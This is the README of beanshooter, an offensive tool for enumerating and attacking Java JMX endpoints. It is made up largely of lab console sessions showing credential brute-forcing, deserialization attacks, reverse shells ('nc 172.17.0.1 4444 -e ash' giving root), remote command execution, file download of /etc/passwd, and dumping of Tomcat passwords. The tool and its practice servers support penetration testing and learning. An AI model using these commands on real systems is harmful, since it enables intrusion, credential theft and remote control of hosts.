### beanshooter

----

*beanshooter* is a *JMX* enumeration and attacking tool, which helps to identify common vulnerabilities on *JMX* endpoints.

![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
[![](https://img.shields.io/badge/version-3.0.0-blue)](https://github.com/qtc-de/beanshooter/releases)
[![](https://img.shields.io/badge/build%20system-maven-blue)](https://maven.apache.org/)
![](https://img.shields.io/badge/java-8%2b-blue)
[![](https://img.shields.io/badge/license-GPL%20v3.0-blue)](https://github.com/qtc-de/beanshooter/blob/master/LICENSE)


### Table of Contents

----

- [Installation](#installation)
- [Supported Operations](#supported-operations)
  + [Basic Operations](#basic-operations)
    - [brute](#brute)
    - [invoke](#invoke)
    - [deploy](#deploy)
    - [enum](#enum)
    - [list](#list)
    - [serial](#serial)
    - [undeploy](#undeploy)
  + [MBean Operations](#mbean-operations)
    - [generic](#generic)
      + [info](#generic-info)
      + [export](#generic-export)
      + [status](#generic-status)
      + [deploy](#generic-deploy)
      + [undeploy](#generic-undeploy)
    - [tonka](#tonka)
      + [exec](#tonka-exec)
      + [background](#tonka-background)
      + [shell](#tonka-shell)
      + [upload](#tonka-upload)
      + [download](#tonka-download)
    - [mlet](#mlet)
      + [load](#mlet-load)
    - [tomcat](#tomcat)
      + [list](#tomcat-list)
- [JMXMP](#jmxmp)
- [Example Server](#example-server)


### Installation

-----

*beanshooter* is a *maven* project and installation should be straight forward. With [maven](https://maven.apache.org/) 
installed, just execute the following commands to create an executable ``.jar`` file:

```console
$ git clone https://github.com/qtc-de/beanshooter
$ cd beanshooter
$ mvn package
```

You can also use prebuild packages that are created for [each release](https://github.com/qtc-de/beanshooter/releases).
Prebuild packages for the development branch are created automatically and can be found on the *GitHub*
[actions page](https://github.com/qtc-de/beanshooter/actions).

*beanshooter* does not include *ysoserial* as a dependency. To enable *ysoserial* support, you need either specify the path
to your ``ysoserial.jar`` file as additional argument (e.g. ``--yso /opt/ysoserial.jar``) or you change the
default path within the [beanshooter configuration file](./beanshooter/config.properties) before building the project.

*beanshooter* supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](/resources/bash_completion.d/beanshooter) to your ``~/.bash_completion.d`` folder enables
autocompletion.

```console
$ cp resources/bash_completion.d/beanshooter ~/bash_completion.d/
```


### Supported Operations

-----

The different *beanshooter* operations can be divided into two groups: *basic operations* and *MBean operations*. Whereas
*basic operations* are used to perform general operations on a *JMX* endpoint, *MBean operations* target a specific *MBean*
to interact with. For more details, check the usage examples in the following sections.

```console
[qtc@devbox ~]$ beanshooter -h
usage: beanshooter [-h]   ...

beanshooter v3.0.0 - a JMX enumeration and attacking tool

positional arguments:
                          
 Basic Operations
    brute                bruteforce JMX credentials
    invoke               invoke the specified method on the specified MBean
    deploy               deploys the specified MBean on the JMX server
    enum                 enumerate the JMX service for common vulnerabilities
    list                 list available MBEans on the remote MBean server
    serial               perform a deserialization attack
    undeploy             undeploys the specified MBEAN from the JMX server

 MBean Operations
    tonka                general purpose bean for executing commands and uploading or download files
    mlet                 default JMX bean that can be used to load additional beans dynamically
    tomcat               tomcat MemoryUserDatabaseMBean used for user management

named arguments:
  -h, --help             show this help message and exit
```


### Basic Operations

---

Basic operations are general purpose operations that can be performed on a JMX service. These are usually
operations that do not target a specific MBean or that target an MBean with no builtin support by beanshooter.

#### Brute

The `brute` action performs a bruteforce attack on a password protected *JMX* service. When running with no additional
optional arguments, *beanshooter* users a builtin wordlist with a few common username-password combinations. For more
dedicated attacks you should use the `--username-file` and `--password-file` options to specify more exhaustive wordlists.

```console
[qtc@devbox ~]$ beanshooter brute 172.17.0.2 1090
[+] Reading wordlists for the brute action.
[+] 	Reading credentials from internal wordlist.
[+]
[+] Starting bruteforce attack with 10 credentials.
[+]
[+] 	Found valid credentials: admin:admin
[+] 	[10 / 10] [########################################] 100%
[+]
[+] done.
```

#### Invoke

The `invoke` action can be used to invoke an arbitrary method on an *MBean* that has already been deployed on a *JMX* endpoint.
Apart from the target, the `invoke` action requires the `ObjectName` of the targeted *MBean*, the method name you want to invoke
and the arguments to use for the call. *MBean* attributes can also be obtained by this action, by using the corresponding getter
function as method. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*:

```console
[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' getLoggerNames ''
[+] sun.rmi.transport.tcp
[+] sun.rmi.server.call
[+] sun.rmi.loader
...
```

When invoking a method that requires arguments, the last *beanshooter* argument is evaluated as *Java code* and attempted to be
parsed as `Object[]`. The following listing shows an example, where the `getLoggerNames` function is invoked on the `Logging` *MBean*.

```console
[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 'java.util.logging:type=Logging' setLoggerLevel '"sun.rmi.transport.tcp", "INFO"'
[+] Call was successful
```

#### Deploy

The `deploy` action can be used to deploy an *MBean* on a *JMX* service. This action **should not** be used to deploy *MBeans* with
default support like e.g. the *TonkaBean*. Deploying *MBeans* with default support should be done through the corresponding
[MBean operations](#mbean-operations).

When the *MBean* you want to deploy is already known to the *JMX* service, it is sufficient to specify the class name of the implementing
*MBean* class and the desired `ObjectName`:

```console
[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 javax.management.monitor.StringMonitor qtc.test:type=Monitor
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: StringMonitor
[+] 	MBean with object name qtc.test:type=Monitor was successfully deployed.
```

When the *MBean* class is not known to the *JMX* service, you can use the `--jar-file` and `--stager-url` options to provide an implementation:

```console
[qtc@devbox ~]$ beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar  --stager-url http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: ExampleBean
[+]
[+] 		MBean class is not known to the server.
[+] 		Starting MBean deployment.
[+]
[+] 			Deplyoing MBean: MLet
[+] 			MBean with object name DefaultDomain:type=MLet was successfully deployed.
[+]
[+] 		Loading MBean from http://172.17.0.1:8000
[+]
[+] 			Creating HTTP server on: 172.17.0.1:8000
[+] 				Creating MLetHandler for endpoint: /
[+] 				Creating JarHandler for endpoint: /c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 				Starting HTTP server... 
[+] 				
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /
[+] 			Sending mlet:
[+]
[+] 				Class:     non.existing.example.ExampleBean
[+] 				Archive:   c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 				Object:    qtc.test:type=Example
[+] 				Codebase:  http://172.17.0.1:8000
[+]
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /c65c3cdc908348d8bd9a22b8a2bf8be3
[+] 			Sending jar file with md5sum: c4d8f40d1c1ac7f3cf7582092802a484
[+]
[+] 	MBean with object name qtc.test:type=Example was successfully deployed.
```

#### Enum

The `enum` action enumerates some configuration details on a *JMX* endpoint. It always checks whether the
*JMX* endpoints requires authentication and whether it allows pre authenticated arbitrary deserialization.

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server requires authentication.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer accepted the payload class.
[+] 	  Configuration Status: Non Defau
```

When no authentication is required, or when you specify valid credentials, the `enum` action also attempts to
enumerate some further information from the *JMX* endpoint. This includes a list of non default *MBeans* and
e.g. the user accounts registered on a *Apache tomcat* server:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 1090
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server does not require authentication.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer rejected the payload class.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+] 	- 57 MBeans are currently registred on the MBean server.
[+] 	  Listing 39 non default MBeans:
[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Valve,host=localhost,name=AccessLogValve)
[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=GlobalRequestProcessor,name="http-nio-8080")
[...]
[+]
[+] Enumerating tomcat users:
[+]
[+] 	- Listing 3 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  P@55w0rD#
[+] 		Roles:
[+] 			   Users:type=Role,rolename="manager-gui",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-script",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-jmx",database=UserDatabase
[+] 			   Users:type=Role,rolename="manager-status",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  s3cr3T!$
[+] 		Roles:
[+] 			   Users:type=Role,rolename="admin-gui",database=UserDatabase
[+] 			   Users:type=Role,rolename="admin-script",database=UserDatabase
[...]
```

#### List

The `list` action prints a list of all registered *MBeans* on the remote *JMX* service:

```console
[qtc@devbox ~]$ beanshooter list 172.17.0.2 9010
[+] Available MBeans:
[+]
[+] 	- sun.management.MemoryManagerImpl (java.lang:name=Metaspace Manager,type=MemoryManager)
[+] 	- sun.management.MemoryPoolImpl (java.lang:name=Metaspace,type=MemoryPool)
[+] 	- javax.management.MBeanServerDelegate (JMImplementation:type=MBeanServerDelegate)
[...]
```

#### Serial

The `serial` action can be used to perform deserialization attacks on a *JMX* endpoint. By default, the action
attempts post authenticated deserialization attacks. For this to work, you target *JMX* service needs either to
allow unauthenticated access or you need valid credentials:

```console
[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin
[+] Attemting deserialization attack on JMX endpoint.
[+]
[+] 	Creating ysoserial payload... done.
[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
[+] 	Deserialization attack was probably successful.

[qtc@devbox ~]$ nc -vlp 4444
[...]
id
uid=0(root) gid=0(root) groups=0(root)
```

*JMX* services can also be vulnerable to pre authenticated deserialization attacks. To abuse this, you can use the `--preauth` switch:

```console
[qtc@devbox ~]$ beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --preauth
[+] Attemting deserialization attack on JMX endpoint.
[+]
[+] 	Creating ysoserial payload... done.
[+] 	MBeanServer attempted to deserialize the DeserializationCanary class.
[+] 	Deserialization attack was probably successful.

[qtc@devbox ~]$ nc -vlp 4444
[...]
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Undeploy

The `undeploy` action removes the *MBean* with the specified `ObjectName` from the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter undeploy 172.17.0.2 9010 qtc.test:type=Example 
[+] Removing MBean with ObjectName qtc.test:type=Example from the MBeanServer.
[+] MBean was successfully removed.
```


### MBean Operations

---

In contrast to [basic operations](#basic-operations) that target the general functionality exposed by a *JMX*
endpoint, *MBean operations* target a specific *MBean*. For each supported *MBean*, *beanshooter* provides
another subparser containing the available operations and options for the corresponding *MBean*. The following
listing shows an example for the `mlet` *MBean* and the associated subparser:

```console
[qtc@devbox ~]$ beanshooter mlet -h
usage: beanshooter mlet [-h]   ...

positional arguments:
                          
    load                 load a new MBean from the specified URL
    status               checks whether the MBean is registered
    info                 print detailed information about the MBean
    deploy               deploys the specified MBean on the JMX server
    undeploy             undeploys the specified MBEAN from the JMX server

named arguments:
  -h, --help             show this help message and exit
```


### Generic MBean Operations

---

Some *beanshooter* operations are available on each *MBean* and are demonstrated in this section.

#### Generic Info

The `info` action lists some information on the specified *MBean*:

```console
[qtc@devbox ~]$ beanshooter tonka info
[+] tonka
[+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
[+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
```

The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
option.

#### Generic Status

The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010 
[+] MBean Status: not deployed
```

#### Generic Deploy

The `deploy` action works basically like the `deploy` action from the [basic operations](#basic-operations).
However, since the class name, `ObjectName` and the implementing jar file are all already associated with
the specified *MBean*, you only need to specify the `--stager-url` option with this action (assuming that
a builtin jar file is available):

```console
[qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: TonkaBean
[+]
[+] 		MBean class is not known to the server.
[+] 		Loading MBean from http://172.17.0.1:8000
[+]
[+] 			Creating HTTP server on: 172.17.0.1:8000
[+] 				Creating MLetHandler for endpoint: /
[+] 				Creating JarHandler for endpoint: /440441bf8c794d40a83caf1e34cd9993
[+] 				Starting HTTP server... 
[+] 				
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /
[+] 			Sending mlet:
[+]
[+] 				Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 				Archive:   440441bf8c794d40a83caf1e34cd9993
[+] 				Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 				Codebase:  http://172.17.0.1:8000
[+]
[+] 			Incoming request from: iinsecure.dev
[+] 			Requested resource: /440441bf8c794d40a83caf1e34cd9993
[+] 			Sending jar file with md5sum: 55a843002e13f763137d115ce4caf705
[+]
[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
```

#### Generic Undeploy

The undeploy action removes the specified *MBean* from a remote *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka undeploy 172.17.0.2 9010 
[+] Removing MBean with ObjectName MLetTonkaBean:name=TonkaBean,id=1 from the MBeanServer.
[+] MBean was successfully removed.
```


### Tonka

---

The *TonkaBean* is a custom *MBean* that is implemented by the *beanshooter* project and allows
file system access and command execution on the *JMX* server. Its actions can be accessed by
using the `tonka` operation, followed by the desired action.

#### Tonka Exec

The `exec` action can be used to invoke a single command on the *JMX* service:

```console
[qtc@devbox ~]$ beanshooter tonka exec 172.17.0.2 9010 id
[+] Invoking the executeCommand method with argument: id
[+] The call was successful
[+]
[+] Server response:
uid=0(root) gid=0(root) groups=0(root)
```

#### Tonka Background

The `background` action executes a single command on the *JMX* server and does not wait for the command
to finish:

```console
[qtc@devbox ~]$ beanshooter tonka background 172.17.0.2 9010 'nc 172.17.0.1 4444 -e ash'
[+] Invoking the executeCommand method with argument: [Ljava.lang.String;@16293aa2
[+] The call was successful
```

#### Tonka Shell

The `shell` action spawns a command shell where you can specify commands that are executed on the *JMX*
server. The shell is not fully interactive and just represents a wrapper around *Javas* `Runtime.exec`
method. However, basic support for environment variables and directory changing is implemented:

```console
[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
[root@172.17.0.2 /]$ id
uid=0(root) gid=0(root) groups=0(root)
[root@172.17.0.2 /]$ cd home
[root@172.17.0.2 /home]$ !env test=example
[root@172.17.0.2 /home]$ sh -c "echo $test"
example
```

The example above demonstrates how to set environment variables using the `!env` keyword. Apart from this
keyword, several others are available:

```console
[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
[root@172.17.0.2 /]$ !help
Available shell commands:
  <cmd>                        execute the specified command
  cd <dir>                     change working directory on the server
  exit|quit                    exit the shell
  !help                        print this help menu
  !env <env-str>               set new environment variables in key=value format
  !upload <src> <dst>          upload a file to the remote MBeanServer
  !download <src> <dst>        download a file from the remote MBeanServer
  !background <cmd>            executes the specified command in the background
```

#### Tonka Upload

The `upload` action can be used to upload a file to the *JMX* server:

```console
[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 ./file.dat /
[+] Uploading local file /home/qtc/file.dat to path /file.dat on the MBeanSerer.
[+] 30001 bytes uploaded successfully
```

#### Tonka Download

The `download` action can be used to download a file from the *JMX* server:

```console
[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd .
[+] Saving remote file /etc/passwd to local path /home/qtc/passwd
[+] 1172 bytes were written.
```


### MLet

---

The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
network. It is already implicitly used by *beanshooter* `deploy` action, but can also be invoked
manually using the `mlet` operation.

#### MLet Load

The currently only implemented *MLet* operation is the `load` operation that can be used to load
an *MBean* class from a user specified *URL*:

```console
[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: MLet
[+] 	MBean with object name DefaultDomain:type=MLet was successfully deployed.
[+]
[+] Loading MBean from http://172.17.0.1:8000
[+]
[+] 	Creating HTTP server on: 172.17.0.1:8000
[+] 		Creating MLetHandler for endpoint: /
[+] 		Creating JarHandler for endpoint: /3584de270132420aaf0812366bc46035
[+] 		Starting HTTP server... 
[+] 		
[+] 	Incoming request from: iinsecure.dev
[+] 	Requested resource: /
[+] 	Sending mlet:
[+]
[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
[+] 		Archive:   3584de270132420aaf0812366bc46035
[+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:  http://172.17.0.1:8000
[+]
[+] 	Incoming request from: iinsecure.dev
[+] 	Requested resource: /3584de270132420aaf0812366bc46035
[+] 	Sending jar file with md5sum: b2f7040f7d8f2d1f40b205d631ff7356
[+]
[+] MBean was loaded successfully.
```

The example above demonstrates how the *TonkaBean* can be loaded using the `mlet` operation. If you want
to load a custom *MBean*, you need to specify `custom` instead of `tonka` and supply the `--class-name`,
`--object-name` and `--jar-file` options:

```console
[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.tonkabean.TonkaBean --object-name MLetTonkaBean:name=TonkaBean,id=2 --jar-file www/tonka-bean.jar
[+] Starting MBean deployment.
[+] ...
[+] MBean was loaded successfully.
```


### Tomcat

---

The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache tomcat*. This *MBean* provides access to user
accounts that are available on a *tomcat* service.

#### Tomcat List

The currently only implemented operation is `list`, which lists available user accounts:

```console
[qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
[+] Listing tomcat users:
[+]
[+] 	----------------------------------------
[+] 	Username:  manager
[+] 	Password:  P@55w0rD#
[+] 	Roles:
[+] 		   Users:type=Role,rolename="manager-gui",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-script",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-jmx",database=UserDatabase
[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
[+]
[+] 	----------------------------------------
[+] 	Username:  admin
[+] 	Password:  s3cr3T!$
[+] 	Roles:
[+] 		   Users:type=Role,rolename="admin-gui",database=UserDatabase
[+] 		   Users:type=Role,rolename="admin-script",database=UserDatabase
[+]
[+] 	----------------------------------------
[+] 	Username:  status
[+] 	Password:  cr@cKM3o.O
[+] 	Roles:
[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
```


### JMXMP

---

*JMX* services can use different connector types. The by far most commonly used connector is *Java RMI*, which
allows access to *JMX* based on the *Java RMI* protocol. Another popular connector is the *JMX Message Protocol*
(*JMXMP*) that, despite being outdated, is still encountered quite often. *beanshooter* has builtin *JMXMP* support
and attempts to connect via *JMXMP* when using the `--jmxmp` option:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4444 --jmxmp
[+] Checking servers SASL configuration:
[+]
[+] 	- Remote JMXMP server does not use SASL.
[+] 	  Login is possible without specifying credentials.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- JMXMP serial check is work in progress but endpoints are usually vulnerable.
[+] 	  Configuration Status: Undecided
[+]
[+] Checking available MBeans:
[+]
[+] 	- 22 MBeans are currently registred on the MBean server.
[+] 	  Found 0 non default MBeans.
```

Authenticated *JMXMP* endpoints are usually protected using *SASL*. With *SASL* enabled, a *JMX* endpoint usually requires
the client to connect with a specific *SASL Profile*. Available profiles for *beanshooter* are:

* plain
* digest
* cram
* ntlm
* gssapi

Each of them can optionally paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
*JMXMP* endpoint, *beanshooter* attempts to enumerate the required *SASL* profile. Whereas determining the required *SASL*
mechanism is usually possible, the required *TLS* setting cannot be obtained:

```console
[qtc@devbox ~]$ beanshooter enum 172.17.0.2 4449 --jmxmp
[+] Checking servers SASL configuration:
[+]
[+] 	- Remote JMXMP server uses SASL/NTLM SASL profile.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- JMXMP serial check is work in progress but endpoints are usually vulnerable.
[+] 	  Configuration Status: Undecided
```


### Example Server

---

Most of the examples presented above are based on the [jmx-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Fjmx-example-server)
and the [tomcat-example-server](https://github.com/qtc-de/beanshooter/pkgs/container/beanshooter%2Ftomcat-example-server).
These servers are contained within this repository in the [docker](/docker) folder and can be used to practice *JMX* enumeration.
You can either build the corresponding containers yourself or load them directly from the *GitHub Container Registry*.

Copyright 2022, Tobias Neitzel and the *beanshooter* contributors.
